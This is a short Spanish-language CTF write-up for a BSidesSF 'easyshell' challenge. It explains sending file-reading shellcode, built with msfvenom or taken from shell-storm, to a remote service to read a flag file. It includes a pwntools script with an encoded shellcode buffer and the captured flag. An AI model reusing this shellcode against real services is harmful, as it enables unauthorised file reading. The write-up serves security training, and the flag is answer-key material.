#### Enunciado

Te daban el código fuente de dos ELF, uno de 32 bits y otro de 64 bits, y un servicio corriendo en un servidor donde tenías que enviar un 
exploit remoto para leer el archivo /home/ctf/flag.txt

#### Solución

Ambos casos se solucionan de la misma manera, creando un shellcode para leer archivos. Sin embargo, para el caso de 32 bits tendremos la inestimable ayuda de metasploit y usaremos el payload de msfvenom de metasploit que te permite leer un archivo. En el caso de 64 bits te puedes programar en ensamblador un shellcode o bien puedes usar uno de los que hay en shell-storm: http://shell-storm.org/shellcode/files/shellcode-878.php


##### Solución 32 bytes

easyshell32


```python
#!/usr/bin/env python
import sys
from pwn import *

buf =  ""
buf += "\x2f\x98\x4b\xfc\x41\x9b\x93\x27\x41\xf5\x91\x40\x98"
buf += "\x9b\xd6\x90\xdd\xc2\xb8\xca\x62\x2e\xa4\xd9\x74\x24"
buf += "\xf4\x5b\x33\xc9\xb1\x15\x83\xc3\x04\x31\x43\x13\x03"
buf += "\x89\x71\xcc\x51\xe6\x40\xa8\x9f\xf8\xac\xc8\xc4\xc9"
buf += "\x65\x05\x7a\xa0\xb5\x2e\x78\xb2\x39\x4f\xf6\x55\xb0"
buf += "\xb6\xb2\x99\xd3\x48\xc3\x54\x53\xc1\x01\xde\x50\xd2"
buf += "\x85\x1e\xe2\xd3\x85\x1e\x14\x19\x05\xa6\x15\xa1\x06"
buf += "\xd6\xae\xa1\x06\xd6\xd0\x6c\x86\x3e\x15\x91\x78\x41"
buf += "\xb9\x06\xe8\xd0\xa3\xf9\x95\x5e\x4a\x29\x3c\xf2\xf3"
buf += "\x52\xee\x7e\x8c\xe8\xee"


addr = "easyshell-f7113918.ctf.bsidessf.net"
conn = remote(addr, 5252)

conn.send(buf)
conn.interactive()
conn.close()
```

FLAG:c832b461f8772b49f45e6c3906645adb


